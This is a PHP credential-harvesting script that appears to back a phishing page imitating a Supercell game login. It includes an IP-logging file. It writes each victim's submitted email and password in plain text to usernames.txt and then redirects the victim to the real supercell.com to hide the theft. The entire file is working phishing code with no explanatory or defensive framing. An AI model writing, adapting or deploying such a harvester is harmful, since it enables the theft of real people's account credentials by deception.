<?php
include 'ip.php';
file_put_contents("usernames.txt", "email=" . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("usernames.txt", "pass=" . $password = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.supercell.com');
?>
